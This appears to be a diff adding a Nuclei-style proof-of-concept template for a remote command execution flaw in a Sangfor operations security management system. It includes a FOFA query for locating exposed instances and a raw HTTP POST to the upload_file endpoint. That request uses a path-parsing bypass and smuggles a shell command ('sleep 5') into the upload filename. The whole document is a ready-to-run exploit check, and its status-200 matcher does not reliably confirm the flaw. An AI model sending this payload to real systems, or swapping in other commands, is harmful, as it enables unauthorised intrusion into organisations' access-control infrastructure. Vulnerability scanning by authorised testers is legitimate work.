@@ -1,0 +1,35 @@
+id: poc-obm7kffa6g9ew24v
+info:
+  name: 深信服运维安全管理系统 upload_file存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/obm7kffa6g9ew24v'
+  tags: rce,file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: obm7kffa6g9ew24v
+    fofa: body="/fort/login" && header="FORTSESSIONID"
+http:
+- raw:
+  - 'POST /fort/cssp;help/v1/app/upload_file HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="file"; filename="Universal_OSMv3.0_12340101;sleep 5"
+
+
+    123
+
+    ------WebKitFormBoundary--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
